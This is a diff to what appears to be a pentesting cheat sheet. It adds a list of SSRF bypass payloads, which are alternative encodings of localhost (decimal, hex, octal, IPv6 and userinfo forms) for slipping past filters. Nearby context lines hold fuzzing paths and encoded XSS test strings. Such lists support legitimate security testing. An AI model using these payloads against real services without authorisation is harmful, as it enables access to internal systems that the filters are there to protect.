@@ -29,6 +29,15 @@ debug/pprof/FUZZ
 alert
 aler%26%23116;%3E
 
+SSRF Bypass list for localhost (127.0.0.1):
+http://127.1/
+http://0000::1:80/
+http://[::]:80/
+http://2130706433/
+http://whitelisted@127.0.0.1
+http://0x7f000001/
+http://017700000001
+http://0177.00.00.01
 
 If '/something' => 403
 Try -
